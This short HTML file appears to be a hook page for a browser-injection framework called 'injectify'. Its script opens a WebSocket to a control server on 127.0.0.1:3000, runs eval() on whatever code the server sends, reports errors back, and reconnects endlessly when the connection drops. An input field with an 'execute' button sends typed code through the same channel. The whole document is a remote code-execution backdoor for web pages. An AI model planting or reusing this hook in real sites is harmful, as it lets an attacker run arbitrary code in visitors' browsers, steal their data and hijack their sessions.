<script>
(function i() {
    window.ws  = new WebSocket('ws://127.0.0.1:3000/inject/websocket/?$' + btoa('private'))
    ws.onmessage = function(d) {
        try {
            d = JSON.parse(d.data)
            eval(d.d)
        } catch(e) {
            ws.send(JSON.stringify({
                t: 'e',
                d: e,
            }))
        }
    }
    ws.onclose = function() {
        // Instantly attempt to open the websocket, retrying every 3 seconds
        setTimeout(i(), 3000)
    }
})()
</script>

<input />
<button onclick="injectify.send('execute', document.getElementsByTagName('input')[0].value)">execute</button>
